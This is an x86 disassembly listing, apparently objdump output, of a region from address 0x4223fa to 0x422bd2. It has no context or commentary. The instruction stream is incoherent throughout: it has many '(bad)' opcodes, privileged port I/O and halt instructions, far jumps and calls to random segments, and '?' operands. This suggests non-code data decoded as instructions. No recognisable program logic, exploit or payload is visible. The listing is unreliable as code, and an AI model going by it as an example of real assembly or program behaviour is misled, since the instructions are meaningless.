  4223fa:	cli    
  4223fb:	repnz (bad) 
  4223fe:	push   esp
  4223ff:	shr    DWORD PTR [ebp-0x7a],1
  422402:	ja     0x4223f7
  422404:	pop    esi
  422405:	push   esp
  422406:	or     BYTE PTR [ebx+0x321f2de2],0xee
  42240d:	test   al,0xb9
  42240f:	push   0xd2f24076
  422414:	in     eax,0x2
  422416:	push   ecx
  422417:	jmp    0x422415
  422419:	in     al,dx
  42241a:	xchg   esp,eax
  42241b:	je     0x4223b9
  42241d:	jbe    0x42239f
  42241f:	int    0xc8
  422421:	push   ecx
  422422:	jno    0x422495
  422424:	mov    BYTE PTR [edx-0x1c],dh
  422427:	stos   DWORD PTR es:[edi],eax
  422428:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422429:	test   BYTE PTR [eax+0x27b7d66d],dl
  42242f:	retf   0x11e5
  422432:	pusha  
  422433:	aaa    
  422434:	nop
  422435:	dec    ebx
  422436:	sbb    ebx,DWORD PTR [ecx-0x4e345748]
  42243c:	jmp    0x1923:0x579a6d4f
  422443:	gs test eax,0x7819c7d4
  422449:	out    0x20,eax
  42244b:	jl     0x42241b
  42244d:	cmp    BYTE PTR [eax-0x7046e766],ch
  422453:	push   ecx
  422454:	push   0xffffff97
  422456:	popf   
  422457:	cmp    BYTE PTR [ebp-0x5e3670cc],al
  42245d:	jns    0x4224cd
  42245f:	idiv   DWORD PTR [ebx]
  422461:	jns    0x422486
  422463:	(bad)  
  422464:	lock sbb eax,ecx
  422467:	ret    
  422468:	inc    eax
  422469:	rol    DWORD PTR [esp+ebx*2+0x684b589e],cl
  422470:	scas   eax,DWORD PTR es:[edi]
  422471:	inc    ebx
  422472:	les    ecx,FWORD PTR [ecx]
  422474:	push   ecx
  422475:	sub    eax,0x5dd6d939
  42247a:	test   DWORD PTR [eax],ebx
  42247c:	cmp    BYTE PTR [ecx],ah
  42247e:	jnp    0x4224dd
  422480:	shl    DWORD PTR [ebx],1
  422482:	ss push eax
  422484:	or     bl,BYTE PTR [ebx-0x720a08e3]
  42248a:	jmp    FWORD PTR [esi]
  42248c:	dec    esp
  42248d:	fldcw  WORD PTR [esi-0x6d]
  422490:	push   ds
  422491:	xchg   esi,eax
  422492:	les    edi,FWORD PTR [ebx+ebx*2]
  422495:	mov    ?,WORD PTR [ebp-0x1c]
  422498:	jg     0x4224d4
  42249a:	mov    ch,0x4e
  42249c:	test   BYTE PTR [edi-0x5fc8d417],bl
  4224a2:	in     eax,dx
  4224a3:	jb     0x42245e
  4224a5:	out    dx,eax
  4224a6:	mov    al,ds:0x89007004
  4224ab:	sub    al,0xcd
  4224ad:	dec    edx
  4224ae:	lods   al,BYTE PTR ds:[esi]
  4224af:	jo     0x422468
  4224b1:	popa   
  4224b2:	out    0x5c,eax
  4224b4:	xor    BYTE PTR [ebx-0x2cae28ef],bl
  4224ba:	xchg   BYTE PTR [esi-0x24f178d4],bh
  4224c0:	xchg   ecx,eax
  4224c1:	push   0x5ef43e61
  4224c6:	imul   ecx,ebp,0xb2ba9cf2
  4224cc:	mov    WORD PTR [edi],es
  4224ce:	dec    ebx
  4224cf:	and    al,0xd4
  4224d1:	loop   0x4224ab
  4224d3:	inc    ecx
  4224d4:	rol    ch,1
  4224d6:	xchg   ecx,eax
  4224d7:	push   es
  4224d8:	push   cs
  4224d9:	xor    eax,0xc5a788f
  4224de:	clc    
  4224df:	add    eax,0x6ac62a65
  4224e4:	scas   eax,DWORD PTR es:[edi]
  4224e5:	iret   
  4224e6:	mov    ecx,0xa3df2ee0
  4224eb:	and    eax,0x17fa5028
  4224f0:	cmp    BYTE PTR [ebx-0x2d],0x44
  4224f4:	adc    edi,DWORD PTR [esi]
  4224f6:	pop    ss
  4224f7:	(bad)  
  4224f8:	jge    0x4224eb
  4224fa:	cmc    
  4224fb:	ds dec edi
  4224fd:	mov    WORD PTR fs:[edx+0x116ce26e],gs
  422504:	out    0x23,eax
  422506:	loop   0x422585
  422508:	push   ebp
  422509:	dec    edx
  42250a:	cdq    
  42250b:	retf   
  42250c:	mov    bl,BYTE PTR gs:[edi+0x3e24a704]
  422513:	dec    esp
  422514:	(bad)  
  422515:	pusha  
  422516:	aad    0x36
  422518:	adc    eax,0x5078c530
  42251d:	repnz inc edi
  42251f:	scas   eax,DWORD PTR es:[edi]
  422520:	pop    esi
  422521:	aas    
  422522:	scas   al,BYTE PTR es:[edi]
  422523:	mov    ecx,0x1096821d
  422528:	jae    0x42253c
  42252a:	stos   DWORD PTR es:[edi],eax
  42252b:	sti    
  42252c:	ja     0x422535
  42252e:	(bad)
  422532:	pop    es
  422533:	jl     0x42254a
  422535:	jo     0x422524
  422537:	jmp    0x557c879b
  42253c:	push   cs
  42253d:	adc    esi,DWORD PTR [edi]
  42253f:	les    esi,FWORD PTR [eax]
  422541:	ins    BYTE PTR es:[edi],dx
  422542:	aam    0xa1
  422544:	cdq    
  422545:	cmp    DWORD PTR [esi+eax*8],ecx
  422548:	xchg   edx,eax
  422549:	mov    bh,0x88
  42254b:	arpl   WORD PTR [ecx+0x33e66402],dx
  422551:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422553:	call   0xc217dcac
  422558:	adc    ebp,DWORD PTR [ebx+0x44]
  42255b:	push   ds
  42255c:	loope  0x42255d
  42255e:	dec    edx
  42255f:	out    0xed,al
  422561:	ret    0x80d3
  422564:	push   ecx
  422565:	cmc    
  422566:	jae    0x422582
  422568:	and    ebp,DWORD PTR [edx+0xa7d1785]
  42256e:	inc    esp
  42256f:	cmp    eax,0x9fc0cdb7
  422574:	hlt    
  422575:	and    ch,BYTE PTR [esi-0x6a3b770a]
  42257b:	dec    ebx
  42257c:	mov    ds,WORD PTR [ebp+edi*2+0x66]
  422580:	xor    DWORD PTR [eax+0x75],edi
  422583:	js     0x4225ff
  422585:	push   es
  422586:	adc    DWORD PTR [edi+0x547f3b28],ebp
  42258c:	xchg   ecx,eax
  42258d:	xor    ch,BYTE PTR [ecx]
  42258f:	inc    edi
  422590:	push   ds
  422591:	mov    WORD PTR ds:0xcc982ac1,?
  422597:	sti    
  422598:	mov    dl,0x2c
  42259a:	and    al,0xb4
  42259c:	jne    0x42260e
  42259e:	push   es
  42259f:	push   0xe34cb8c0
  4225a4:	add    ch,BYTE PTR [edi-0x71]
  4225a7:	or     ecx,DWORD PTR [esp+edi*4-0x22]
  4225ab:	shl    DWORD PTR [ebp-0x5e],0x25
  4225af:	js     0x422588
  4225b1:	loop   0x4225be
  4225b3:	push   ss
  4225b4:	or     al,0xd5
  4225b7:	mov    ch,0x81
  4225b9:	jg     0x422584
  4225bb:	arpl   si,si
  4225bd:	xchg   ebp,eax
  4225be:	jge    0x422607
  4225c0:	and    al,0x88
  4225c2:	div    esi
  4225c4:	ret    
  4225c5:	xchg   esp,eax
  4225c6:	xor    BYTE PTR [ecx],ch
  4225c8:	sbb    edx,DWORD PTR [ecx+0x413440eb]
  4225ce:	pop    es
  4225cf:	(bad)  
  4225d0:	call   DWORD PTR [esi]
  4225d2:	inc    esi
  4225d3:	xor    bh,dh
  4225d5:	out    0x1d,eax
  4225d7:	fwait
  4225d8:	popa   
  4225d9:	xchg   edi,eax
  4225da:	loop   0x422600
  4225dc:	inc    esi
  4225dd:	sar    BYTE PTR [ebx-0x50],cl
  4225e0:	(bad)  
  4225e2:	adc    BYTE PTR [esi+0x60],al
  4225e5:	pop    edx
  4225e6:	lods   al,BYTE PTR ds:[esi]
  4225e7:	push   cs
  4225e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225e9:	aad    0xfe
  4225eb:	sbb    bl,BYTE PTR [esi-0x63]
  4225ee:	mov    ecx,0x5cb0b78d
  4225f3:	xchg   BYTE PTR [edx],cl
  4225f5:	mov    cl,0x1d
  4225f7:	and    edi,DWORD PTR [ecx-0x6efd03b1]
  4225fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225fe:	aaa    
  4225ff:	mov    eax,0x10813b88
  422604:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422605:	dec    edx
  422606:	shr    dl,cl
  422608:	mov    ch,0x4
  42260a:	jg     0x4225ba
  42260c:	fcomp  QWORD PTR [ebx]
  42260e:	mov    dh,0xa6
  422610:	lock mov ch,0xe5
  422613:	sub    eax,0x47ab83a2
  422618:	int    0xd0
  42261a:	push   ecx
  42261b:	sbb    cl,BYTE PTR [edx+0x21c2da8c]
  422621:	inc    edx
  422622:	test   DWORD PTR [ebp-0x4b],ebp
  422625:	rcr    BYTE PTR [esp+esi*1],1
  422628:	(bad)  
  422629:	pavgb  mm5,QWORD PTR [esi-0x1b]
  42262d:	cmp    ecx,DWORD PTR [ebp-0x60]
  422630:	jmp    0x4d8e8b6
  422635:	fisubr WORD PTR [edi+ecx*1]
  422638:	and    esp,DWORD PTR [ebp-0x59]
  42263b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42263c:	sbb    eax,ebx
  42263e:	fimul  WORD PTR [edi]
  422640:	ror    DWORD PTR [ecx+0x81399c3],cl
  422646:	jmp    0xbdc068b8
  42264b:	fs pop edx
  42264d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42264e:	and    al,0x93
  422650:	mov    eax,ds:0x85cc40ac
  422655:	stos   DWORD PTR es:[edi],eax
  422656:	retf   
  422657:	mov    al,0x7a
  422659:	sbb    ah,BYTE PTR [esi+ebp*8]
  42265c:	adc    bl,BYTE PTR [ebx+0x23]
  42265f:	scas   eax,DWORD PTR es:[edi]
  422660:	push   esi
  422661:	das    
  422662:	pusha  
  422663:	mov    al,ds:0x92bc5075
  422668:	loopne 0x4226cb
  42266a:	xor    esi,DWORD PTR [edx+0x4c]
  42266d:	push   es
  42266e:	mov    ebx,0xd17d3fa2
  422673:	hlt    
  422674:	xchg   esi,eax
  422675:	lahf   
  422676:	jae    0x422666
  422678:	inc    ecx
  422679:	mov    esi,DWORD PTR [eax+0x9]
  42267c:	enter  0xfba,0x1e
  422680:	lea    ecx,[edx]
  422682:	push   esp
  422683:	nop
  422684:	adc    dh,BYTE PTR [edi+0x6a9b427d]
  42268a:	adc    edx,DWORD PTR [eax]
  42268c:	cmp    esi,ebp
  42268e:	jmp    0x422649
  422690:	sub    cl,bl
  422692:	repnz lods eax,DWORD PTR ds:[esi]
  422694:	(bad)  
  422695:	adc    bl,BYTE PTR [ebx]
  422697:	and    al,0xba
  422699:	call   0x6030:0xfa2799e4
  4226a0:	test   BYTE PTR ds:0x3341b970,0x9a
  4226a7:	cmp    eax,0x55195114
  4226ac:	(bad)  
  4226ad:	xchg   ebp,eax
  4226ae:	out    0x72,al
  4226b0:	retf   0x12e3
  4226b3:	call   0x9067:0x94de8665
  4226ba:	jecxz  0x4226ad
  4226bc:	xchg   edx,eax
  4226bd:	jge    0x4226a6
  4226bf:	pushf  
  4226c0:	cld    
  4226c1:	cmp    eax,0x3822fe30
  4226c6:	or     BYTE PTR [esi-0x4c],bl
  4226c9:	(bad)  
  4226ca:	and    eax,0x87be0000
  4226cf:	lods   eax,DWORD PTR ds:[esi]
  4226d0:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4226d2:	push   eax
  4226d3:	ret    
  4226d4:	into   
  4226d5:	push   esp
  4226d6:	retf   
  4226d7:	xchg   edi,eax
  4226d8:	lds    ecx,FWORD PTR [esp+edx*8+0x33]
  4226dc:	sub    bl,BYTE PTR fs:[ecx+0x4f8ec7f]
  4226e3:	mov    dh,0x89
  4226e5:	(bad)  
  4226e6:	mov    ecx,0xa3fa24ad
  4226eb:	js     0x42274e
  4226ed:	sbb    al,0x8b
  4226ef:	popf   
  4226f0:	mov    ?,WORD PTR ds:0xec5575e6
  4226f6:	arpl   WORD PTR [esp+edi*4],ax
  4226f9:	dec    eax
  4226fa:	add    DWORD PTR [ebx+0xd],ecx
  4226fd:	jb     0x422711
  4226ff:	mov    ds:0x2512af3c,eax
  422704:	imul   ebx,ebx,0x8f9a9715
  42270a:	push   esp
  42270b:	cmp    ch,BYTE PTR [ebp-0x2f853d58]
  422711:	imul   ecx,DWORD PTR [edi+0x48],0x44
  422715:	into   
  422716:	sub    esi,DWORD PTR [ebp-0x66]
  422719:	(bad)  
  42271a:	cmp    al,0xc8
  42271c:	dec    esi
  42271d:	daa    
  42271e:	loop   0x422731
  422720:	jns    0x4226d7
  422722:	or     al,0x46
  422724:	clc    
  422725:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422726:	imul   ecx,DWORD PTR [edx],0xffffffc8
  422729:	dec    ebx
  42272a:	push   ss
  42272b:	sbb    BYTE PTR [edx+0x683cd024],bh
  422731:	lock in al,dx
  422733:	sbb    DWORD PTR [edi+0x18f7a575],ebx
  422739:	(bad)  
  42273a:	loopne 0x4226ca
  42273c:	push   esp
  42273d:	call   0x3923:0x9efbe4b8
  422744:	retf   0x9e9e
  422747:	cmp    BYTE PTR ds:0xf76d951d,cl
  42274d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42274e:	or     esi,ebx
  422750:	jle    0x422739
  422752:	cwde   
  422753:	(bad)  
  422754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422755:	mov    edx,0xf6e3604e
  42275a:	sbb    DWORD PTR [bx+si-0x6eb8],eax
  42275f:	lea    ecx,[eax]
  422761:	inc    edi
  422762:	bound  eax,QWORD PTR [ecx-0x22]
  422765:	jo     0x422717
  422767:	mov    ds:0x651f6b1a,al
  42276c:	aaa    
  42276d:	pusha  
  42276e:	popa   
  42276f:	cmp    edx,DWORD PTR [esi]
  422771:	repnz (bad) 
  422773:	call   0x45e7:0xdd7f3196
  42277a:	cwde   
  42277b:	iret   
  42277c:	les    ecx,FWORD PTR [eax-0x11]
  42277f:	aaa    
  422780:	retf   0xdff
  422783:	shl    DWORD PTR ds:0xef7464b,1
  422789:	retf   
  42278a:	daa    
  42278b:	in     al,dx
  42278c:	test   BYTE PTR [ecx],bl
  42278e:	fidiv  WORD PTR [edi-0xb]
  422791:	outs   dx,DWORD PTR ds:[esi]
  422792:	pop    ebx
  422793:	inc    esp
  422794:	jae    0x42271a
  422796:	cmp    dh,bh
  422798:	retf   
  422799:	pop    es
  42279a:	sbb    DWORD PTR [eax+0x53a366f0],eax
  4227a0:	retf   0xba14
  4227a3:	pop    ds
  4227a4:	clc    
  4227a5:	iret   
  4227a6:	pop    eax
  4227a7:	lock push esp
  4227a9:	in     al,0x60
  4227ab:	push   ss
  4227ac:	mov    edx,0x8639c8fb
  4227b1:	daa    
  4227b2:	pop    edx
  4227b3:	jl     0x422816
  4227b5:	fs jo  0x4227a2
  4227b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227b9:	mov    ecx,0x54a015c3
  4227be:	fs pop esi
  4227c0:	mov    WORD PTR [edi+0x7fb288f9],cs
  4227c6:	popf   
  4227c7:	(bad)  
  4227c8:	shl    BYTE PTR [ebp+eiz*8+0x33],0x26
  4227cd:	push   ebx
  4227ce:	mov    ecx,DWORD PTR [esp+ecx*4-0x32]
  4227d2:	inc    edx
  4227d3:	ss inc ecx
  4227d5:	sub    BYTE PTR [ebx-0x3eb920d4],cl
  4227db:	inc    ebx
  4227dc:	imul   esp,esi,0xffffffb9
  4227df:	call   0x1cff:0x8739a94f
  4227e6:	test   DWORD PTR [edx-0x67fa4656],ecx
  4227ec:	shr    BYTE PTR [ebx],0x74
  4227ef:	cmp    ebp,edx
  4227f1:	(bad)  
  4227f2:	mov    esi,0xa6c577cd
  4227f7:	mov    ebx,0x6e634eb5
  4227fc:	in     al,dx
  4227fd:	ins    BYTE PTR es:[edi],dx
  4227fe:	in     al,0x21
  422800:	les    dx,DWORD PTR [edi+0xe]
  422804:	pushf  
  422805:	neg    BYTE PTR [ecx+0x63276987]
  42280b:	sahf   
  42280c:	pop    edi
  42280d:	pop    ebx
  42280e:	imul   ecx,DWORD PTR ds:0x71b4f62c,0xe149a3fc
  422818:	dec    ebx
  422819:	(bad)  
  42281a:	sar    esi,cl
  42281c:	mov    edi,0xab149057
  422821:	or     BYTE PTR [ecx],bh
  422823:	mov    bh,0xc3
  422825:	js     0x4227f4
  422827:	out    dx,al
  422828:	pop    ss
  422829:	lea    ebx,[ebx+0xf]
  42282c:	add    dl,bl
  42282e:	add    esp,DWORD PTR [esi+0x2696b852]
  422834:	pop    edx
  422835:	and    BYTE PTR [ecx+0x4763d588],0x7d
  42283c:	pop    ebp
  42283d:	and    DWORD PTR [ebp+0x77],0x53
  422841:	mov    ebx,0xf21aa2c2
  422846:	into   
  422847:	cmp    BYTE PTR [eax],bl
  422849:	lods   eax,DWORD PTR ds:[esi]
  42284a:	ret    
  42284b:	or     ebx,0x892e7080
  422851:	test   BYTE PTR [ebx],ch
  422853:	cwde   
  422854:	cli    
  422855:	pop    esi
  422856:	sahf   
  422857:	jle    0x422885
  422859:	imul   edx,esi,0x440f9db
  42285f:	mov    ecx,0x25f9bea2
  422864:	sar    BYTE PTR [edx+0x13],cl
  422867:	pop    edx
  422868:	xor    edi,0x3b018a49
  42286e:	cdq    
  42286f:	arpl   di,si
  422871:	into   
  422872:	div    DWORD PTR [esp+ecx*8]
  422875:	jmp    0x5d21:0x51bc5b69
  42287c:	out    0x78,al
  42287e:	enter  0x219d,0xf3
  422882:	es test DWORD PTR gs:[eax],ebp
  422886:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422887:	popa   
  422888:	sub    DWORD PTR [edx-0xfb1e66e],ecx
  42288e:	sub    eax,0x77452169
  422893:	sub    eax,0xe865dc6c
  422898:	pop    eax
  422899:	xchg   ebp,eax
  42289a:	jo     0x4228de
  42289c:	fistp  DWORD PTR [eax+0x41]
  42289f:	push   ecx
  4228a0:	fstp   DWORD PTR [ebx+0x17]
  4228a3:	mov    ds:0x5cbabeb1,eax
  4228a8:	sbb    BYTE PTR [ebx-0x16],0x2f
  4228ac:	xchg   DWORD PTR [eax],eax
  4228ae:	fs ret 
  4228b0:	or     bl,dh
  4228b2:	hlt    
  4228b3:	sbb    edx,esi
  4228b5:	push   ebp
  4228b6:	add    eax,ebx
  4228b8:	(bad)  
  4228b9:	je     0x4228db
  4228bb:	jecxz  0x422871
  4228bd:	rdtsc  
  4228bf:	or     al,0xe7
  4228c1:	stos   BYTE PTR es:[edi],al
  4228c2:	nop
  4228c3:	sbb    al,0xf5
  4228c5:	jne    0x422890
  4228c7:	jle    0x4228b8
  4228c9:	nop
  4228ca:	pop    ebp
  4228cb:	mov    ds:0xd6a8b951,al
  4228d0:	cdq    
  4228d1:	adc    eax,0x37ba00ba
  4228d6:	cwde   
  4228d7:	cs and dl,al
  4228da:	clc    
  4228db:	jnp    0x422959
  4228dd:	dec    ecx
  4228de:	(bad)  
  4228df:	and    edx,edx
  4228e1:	popf   
  4228e2:	inc    ecx
  4228e3:	mov    edx,esi
  4228e5:	and    BYTE PTR [edi],bh
  4228e7:	ins    BYTE PTR es:[edi],dx
  4228e8:	nop
  4228e9:	jl     0x422948
  4228eb:	or     al,0x7
  4228ed:	repz dec esp
  4228ef:	jecxz  0x422876
  4228f1:	mov    ebp,0xf27e6827
  4228f6:	fisttp WORD PTR [esp+eiz*4-0x67]
  4228fa:	imul   edi,DWORD PTR ds:0xd01dec47,0x2d86fcb3
  422904:	cdq    
  422905:	add    DWORD PTR [edx+0x4c],ecx
  422908:	fstp   TBYTE PTR [esi+eax*2]
  42290b:	icebp  
  42290c:	das    
  42290d:	push   ds
  42290e:	mov    ch,0x5e
  422910:	mul    bl
  422912:	sti    
  422913:	mov    bh,0x43
  422915:	dec    ebx
  422916:	cmp    al,0x24
  422918:	jbe    0x422994
  42291a:	adc    DWORD PTR [eax+0x7d3d72cc],ecx
  422920:	mov    BYTE PTR ds:0xb04c305b,bh
  422926:	gs (bad) 
  422928:	fnstsw WORD PTR [edi+0x1f]
  42292b:	arpl   WORD PTR [edx],bp
  42292d:	or     edx,edi
  42292f:	mov    bh,0x4
  422931:	inc    esp
  422932:	push   ss
  422933:	pop    ebx
  422934:	sub    al,0x1e
  422936:	or     dh,BYTE PTR [ebp+0x14]
  422939:	stos   BYTE PTR es:[edi],al
  42293a:	cmp    esp,esp
  42293c:	daa    
  42293d:	lods   al,BYTE PTR ds:[esi]
  42293e:	dec    BYTE PTR [ecx-0xd]
  422941:	dec    eax
  422942:	add    eax,DWORD PTR [ecx]
  422944:	or     BYTE PTR [ecx+0x49fdb59c],cl
  42294a:	mov    ds:0xea380843,eax
  42294f:	and    DWORD PTR [edx],eax
  422951:	cwde   
  422952:	test   al,0xb1
  422954:	ins    BYTE PTR es:[edi],dx
  422955:	or     eax,0xcbfdb7e0
  42295a:	inc    ecx
  42295b:	ror    DWORD PTR [ecx-0x1f],0xd0
  42295f:	inc    esp
  422960:	daa    
  422961:	popf   
  422962:	clc    
  422963:	call   0xa27f11fe
  422968:	test   eax,0xc84ec061
  42296d:	and    ecx,DWORD PTR [esi-0x382c51b]
  422973:	stos   BYTE PTR es:[edi],al
  422974:	retf   
  422975:	loopne 0x422909
  422977:	daa    
  422978:	imul   edx,DWORD PTR [ecx-0x1f],0x40
  42297c:	adc    esi,DWORD PTR [ebx-0x5b11a294]
  422982:	cmp    al,0xff
  422984:	or     al,0xa
  422986:	sub    ebx,DWORD PTR [edx+0x26]
  422989:	pop    es
  42298a:	mov    ds:0x44cdddb0,al
  42298f:	fnsave [ebp+0x74aba4d]
  422995:	push   0xfc758851
  42299a:	push   edx
  42299b:	xchg   ebx,eax
  42299c:	sbb    al,BYTE PTR [esi]
  42299e:	fs (bad) 
  4229a0:	popa   
  4229a1:	pop    esi
  4229a2:	loopne 0x4229ec
  4229a4:	je     0x422a08
  4229a6:	push   esi
  4229a7:	arpl   dx,dx
  4229a9:	fisttp WORD PTR [eax+0x51]
  4229ac:	mov    al,ds:0x5370b0d3
  4229b1:	mov    al,ds:0xdfb037d5
  4229b6:	or     eax,0xbe415e33
  4229bb:	xchg   ebx,eax
  4229bc:	adc    DWORD PTR [edi-0x60],edi
  4229bf:	dec    edi
  4229c0:	les    ebx,FWORD PTR [ecx-0x3c4bd82e]
  4229c6:	(bad)  
  4229c7:	jno    0x42294c
  4229c9:	scas   al,BYTE PTR es:[edi]
  4229ca:	push   edx
  4229cb:	cvtps2pd xmm6,QWORD PTR [ebp+0x17b0cfbf]
  4229d2:	(bad)  
  4229d3:	fist   WORD PTR [ebx+eiz*8-0x66]
  4229d7:	pushf  
  4229d8:	or     al,0x3
  4229da:	(bad)  
  4229db:	loop   0x422a1d
  4229dd:	mov    esp,DWORD PTR [edi-0x35]
  4229e0:	popf   
  4229e1:	cwde   
  4229e2:	push   cs
  4229e3:	ins    DWORD PTR es:[edi],dx
  4229e4:	std    
  4229e5:	pop    edx
  4229e6:	sbb    eax,0xc3f7f905
  4229eb:	cmp    al,bh
  4229ed:	mov    eax,ds:0xa4b72507
  4229f2:	ja     0x422a61
  4229f4:	rcr    al,0x7c
  4229f7:	pop    ss
  4229f8:	ret    
  4229f9:	xchg   DWORD PTR [edi*2+0x19650123],ebx
  422a00:	mov    edi,0xcd8eff7c
  422a05:	add    DWORD PTR [ebp+eiz*1-0x7],esi
  422a09:	ret    
  422a0a:	sub    al,0xa3
  422a0c:	pop    eax
  422a0d:	div    DWORD PTR [ebp-0x1bcf4928]
  422a13:	mov    ecx,0x9c6e467b
  422a18:	mov    ds:0xd812d8f6,al
  422a1d:	dec    eax
  422a1e:	mov    ah,dh
  422a20:	push   ecx
  422a21:	xchg   ebp,eax
  422a22:	int3   
  422a23:	or     esp,DWORD PTR [edx]
  422a25:	xor    al,0x4a
  422a27:	sub    BYTE PTR [ebx-0x7e],0xbf
  422a2b:	dec    ecx
  422a2c:	push   edi
  422a2d:	retf   
  422a2e:	xchg   ebx,eax
  422a2f:	push   edx
  422a30:	aaa    
  422a31:	fisub  WORD PTR [edi+0x1e0c4ef7]
  422a37:	pop    esi
  422a38:	mul    dh
  422a3a:	jmp    0x8add300b
  422a3f:	in     eax,0x90
  422a41:	pusha  
  422a42:	xchg   BYTE PTR [edx-0xac7a5ab],al
  422a48:	test   BYTE PTR [edx-0x1e66a167],bh
  422a4e:	dec    edx
  422a4f:	fidivr WORD PTR [edi-0x26]
  422a52:	mov    bh,0x56
  422a54:	sbb    BYTE PTR [eax-0x74],ch
  422a57:	xchg   esp,eax
  422a58:	pop    ebp
  422a59:	mov    dl,0x9a
  422a5b:	jnp    0x422a63
  422a5d:	jecxz  0x422a3b
  422a5f:	rcl    DWORD PTR [ebp-0x5140c102],0x1
  422a66:	test   ecx,edx
  422a68:	pop    ebp
  422a69:	fst    QWORD PTR [di+0x27]
  422a6d:	jb     0x422a07
  422a6f:	or     eax,0xc4f54b6b
  422a74:	mov    al,0xdf
  422a76:	imul   esi,DWORD PTR [edi+0x4e],0x4b
  422a7a:	daa    
  422a7b:	pop    esp
  422a7c:	mov    DWORD PTR gs:[ecx+edx*8-0xd90b75a],ebx
  422a84:	sub    eax,0x5757464a
  422a89:	or     bh,BYTE PTR [edi+0x33a82041]
  422a8f:	loope  0x422a2b
  422a91:	mov    ds:0x2e3e44e4,eax
  422a96:	ficomp DWORD PTR [esi]
  422a98:	dec    ebp
  422a99:	test   BYTE PTR [edi+0x29fba3a5],dl
  422a9f:	and    BYTE PTR [ebp-0x11],al
  422aa2:	test   eax,0x207f1319
  422aa7:	daa    
  422aa8:	fcom   st(1)
  422aaa:	cmp    bl,BYTE PTR [ebp-0x40]
  422aad:	(bad)  
  422aae:	xchg   esp,eax
  422aaf:	cmp    eax,0x73dbf746
  422ab4:	add    dl,dl
  422ab6:	imul   eax,DWORD PTR [edx-0x52],0x8013d9e2
  422abd:	(bad)  
  422abe:	fstp   st(0)
  422ac0:	cs (bad) 
  422ac2:	dec    ebp
  422ac3:	adc    DWORD PTR ds:0xde87bc88,esi
  422ac9:	jecxz  0x422a9a
  422acb:	pop    esp
  422acc:	in     eax,0x6a
  422ace:	xchg   ebx,eax
  422acf:	xchg   BYTE PTR [ebp+ebx*8-0x4c917863],bh
  422ad6:	fidivr DWORD PTR [ebx+eax*4]
  422ad9:	ret    0x30d4
  422adc:	lea    esi,[ecx+0x5ff7613f]
  422ae2:	mov    eax,ds:0x93329197
  422ae7:	jp     0x422b0f
  422ae9:	mov    bl,0x77
  422aeb:	push   edx
  422aec:	mov    esi,DWORD PTR [edi]
  422aee:	sub    BYTE PTR [esi+ebp*4],bl
  422af1:	dec    esi
  422af2:	xchg   BYTE PTR [ebx-0x5e22734c],dl
  422af8:	jp     0x422b0b
  422afa:	addr16 and eax,0x12849ebf
  422b00:	xor    BYTE PTR ds:0x1c4c1f9a,0xff
  422b07:	xchg   BYTE PTR [ebp+0x78f7c8f9],cl
  422b0d:	icebp  
  422b0e:	fidiv  DWORD PTR [eax+0x66]
  422b11:	mov    dh,0x3a
  422b13:	push   ds
  422b14:	or     al,0x1e
  422b16:	mov    al,0x3b
  422b18:	stos   BYTE PTR es:[edi],al
  422b19:	mov    dh,0xfd
  422b1b:	data16 repnz into 
  422b1e:	pop    DWORD PTR [esi+0x10]
  422b21:	sub    edx,DWORD PTR [ecx-0x60883a0]
  422b27:	stc    
  422b28:	sub    eax,0x98410009
  422b2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b2e:	mov    eax,0x511bfa94
  422b33:	cmp    ebx,DWORD PTR [ebx-0x77782f10]
  422b39:	je     0x422b49
  422b3b:	adc    BYTE PTR [esi],bh
  422b3d:	call   0x5af11734
  422b42:	xor    cl,0x56
  422b45:	push   edi
  422b46:	scas   eax,DWORD PTR es:[edi]
  422b47:	call   0x667b:0x4236316c
  422b4e:	push   esi
  422b4f:	in     al,0xb7
  422b51:	(bad)  
  422b53:	jbe    0x422b3a
  422b55:	outs   dx,BYTE PTR ds:[esi]
  422b56:	cdq    
  422b57:	jle    0x422b5b
  422b59:	inc    esi
  422b5a:	jne    0x422b92
  422b5c:	xchg   edi,edi
  422b5e:	and    ebx,ebp
  422b60:	xlat   BYTE PTR ds:[ebx]
  422b61:	mov    eax,0x3549f2ed
  422b66:	mov    bl,0x2e
  422b68:	push   ebp
  422b69:	add    eax,0x5f904686
  422b6e:	add    dl,dl
  422b70:	pushf  
  422b71:	rcl    BYTE PTR [edx],0x57
  422b74:	pop    ecx
  422b75:	shl    DWORD PTR [esp+edi*8-0x49],cl
  422b79:	mov    ds:0xca83c2a4,al
  422b7e:	arpl   WORD PTR [eax-0x256e1c19],dx
  422b84:	xchg   edx,eax
  422b85:	test   BYTE PTR [edi],al
  422b87:	sbb    DWORD PTR [ebp-0x5f],0xffffffa8
  422b8b:	and    dl,BYTE PTR [edi]
  422b8d:	dec    edi
  422b8e:	cld    
  422b8f:	adc    eax,0x6bd23aee
  422b94:	out    0xb8,eax
  422b96:	push   es
  422b97:	push   edi
  422b98:	nop
  422b99:	mov    al,ds:0xf9dac957
  422b9e:	push   eax
  422b9f:	push   ebx
  422ba0:	fs ret 0x5482
  422ba4:	dec    BYTE PTR [esi]
  422ba6:	or     ah,BYTE PTR [edi+0x5097a15a]
  422bac:	frstor [esi-0x5]
  422baf:	jbe    0x422bd6
  422bb1:	gs push 0xffffffa4
  422bb4:	mov    eax,ds:0x6ded8952
  422bb9:	mov    esp,0xda6d6cf5
  422bbe:	push   0x3c6c54fe
  422bc3:	add    ah,ch
  422bc5:	cwde   
  422bc6:	fs sub al,0x4e
  422bc9:	cld    
  422bca:	push   es
  422bcb:	or     ebp,DWORD PTR [ecx+0x31]
  422bce:	sub    dh,ah
  422bd0:	lods   al,BYTE PTR ds:[esi]
  422bd1:	lods   eax,DWORD PTR ds:[esi]
  422bd2:	outs   dx,DWORD PTR ds:[esi]
